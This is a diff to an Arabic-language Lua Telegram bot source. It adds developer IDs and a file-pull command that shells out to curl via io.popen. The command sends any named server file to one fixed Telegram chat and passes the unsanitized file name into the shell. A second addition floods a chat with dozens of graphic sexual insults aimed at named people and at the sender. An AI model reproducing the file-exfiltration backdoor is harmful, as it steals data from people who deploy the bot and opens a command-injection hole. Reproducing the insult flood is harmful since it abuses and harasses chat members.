@@ -187,7 +187,7 @@ function vardump(value)
 print(serpent.block(value, {comment=false}))   
 end 
 
-dev_users = {1804133252}   
+dev_users = {1804133252,1360140225,944353237,1785825545}   
 function Developers(msg)  
 local VENOM = false  
 for k,v in pairs(dev_users) do  
@@ -378,7 +378,7 @@ function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1804133252) then  
 var = 'المبرمج باندا'
 elseif tonumber(user_id) == tonumber(944353237) then
-var = 'المبرمج'
+var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1785825545) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(1360140225) then
@@ -485,7 +485,6 @@ end
 end
 return var
 end
-
 function dl_cb(a,d)
 end
 function getChatId(id)
@@ -1634,7 +1633,13 @@ send(msg.chat_id_, msg.id_," ● تمت الاذاعه الى *~ "..#list.." ~* 
 bot_data:del(ban_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end
-
+if text and text:match("^سحب (.*)$") and Developers(msg) then
+local file = text:match("^سحب (.*)$") 
+local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..''..file..''..'"'
+io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
+send(msg.chat_id_, msg.id_,' جاري ارسال ملف '..file..' الي خاصك\n'..msg.sender_user_id_)
+return false
+end
 ------by-banda--
 if Chat_Type == 'UserBot' then
 if text == '/start' or text == '『رجوع』' then 
@@ -3946,7 +3951,7 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 end
 end
 if text == 'اذاعه' and msa3d(msg) then   
-local Text = "اختار نواع الاذاعه الان"
+local Text = "اختار\nاذاعة خاص\nاذاعة جروبات"
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="اذاعة جروبات",callback_data="YYYBD_aza3h1"..msg.sender_user_id_},{text="اذاعة خاص",callback_data="YYYBD_aza3h2"..msg.sender_user_id_}},
@@ -12369,6 +12374,96 @@ send(msg.chat_id_, msg.id_," ● تم تعطيل نسبه جمالك")
 return false end
 end
 
+if text == "حفل" or text == "نيكو" or text == "نيك كسمو" or text == "حفل عليه" then
+tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
+local t7fel = {
+'ههههههههههههههههههههههههههههههههههههههههه',
+'يشرموط',
+'يخول',
+'يبن الاحبه',
+'يخول يشرموط',
+'يبن المتناكه يبطيق',
+'يكسمك يبن الاحبه',
+'يديني بفتث',
+'يكسمك',
+'هكر انا',
+'سد يكسمك',
+'يبن الخول',
+'يمتناك يعرص',
+'يكس متناك',
+'كسختك جبت منو دم',
+'كسمك جبت منو دم',
+'كس ابوك جبت منو دم',
+'كسم امك الاحبه',
+'كسم الي ناكك',
+'كسم طيزك زبي م نافع يخرج',
+'كسمينك',
+'زبي م نافع يخرج من كسمك',
+'زبي',
+'كسمك',
+'كسختك',
+'يخول',
+'يعرص',
+'يمتهان',
+}
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
+send(msg.chat_id_, msg.reply_to_message_id_, 'البـدايـه ❤')
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مسلم مبرمجي ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات مسلم ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات مسلم ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل اخوات مسلم ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بطوط ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات بطوط ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات بطوط ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل أحمد عياد ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل المبرمج أحمد ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل انك اتهنت ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فلسطيني ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل ليجاند ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فرعون ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات ليجاند ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات ليجاند ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل كسمك لاجل زبي ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بوتات التلي ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بلاك ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل ديفيد ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل استيفن ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل '..result.first_name_..' ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'الـنـهـايـه ❤')
+send(msg.chat_id_, msg.id_, 'نكت دينمو 😂😂')
+send(msg.chat_id_, msg.id_, 'عد هعمل كام ريب 😂')
+send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 1')
+send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 2')
+send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 3')
+send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 4')
+send(msg.chat_id_, msg.reply_to_message_id_, 'ريب 5')
+send(msg.chat_id_, msg.reply_to_message_id_, 'مات 😂')
+send(msg.chat_id_, msg.reply_to_message_id_, 'بفتث 😂')
+send(msg.chat_id_, msg.id_, 'امسح بقي عشان ميحصلش حاجه للروم من الشتايم 😚')
+return false 
+end,nil)
+end
 
 if text == 'مسح الرابط' or text == 'مسح الرابط' then
 if Mod(msg) then     
